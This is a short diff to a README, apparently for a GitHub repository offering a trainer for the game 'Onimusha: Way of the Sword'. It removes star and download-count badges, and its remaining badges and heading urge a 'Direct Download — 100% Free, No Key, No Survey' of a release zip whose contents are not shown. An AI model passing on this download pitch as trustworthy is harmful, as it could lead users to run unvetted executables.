@@ -21,9 +21,6 @@
 [![OS](https://img.shields.io/badge/Windows-10_%7C_11-0078D4?style=flat-square&logo=windows)](../../releases/download/main/onimusha-way-of-the-sword-trainer.zip)
 [![Status](https://img.shields.io/badge/Status-Working-00C853?style=flat-square)](../../releases/download/main/onimusha-way-of-the-sword-trainer.zip)
 [![License](https://img.shields.io/badge/License-MIT-blueviolet?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/RestraintRatTurbine/onimusha-way-of-the-sword-trainer?style=flat-square&color=FFD700)](../../stargazers)
-[![Downloads](https://img.shields.io/github/downloads/RestraintRatTurbine/onimusha-way-of-the-sword-trainer/total?style=flat-square&color=CC2200)](../../releases)
-
 <br/>
 
 ### ⬇️ Direct Download — 100% Free, No Key, No Survey
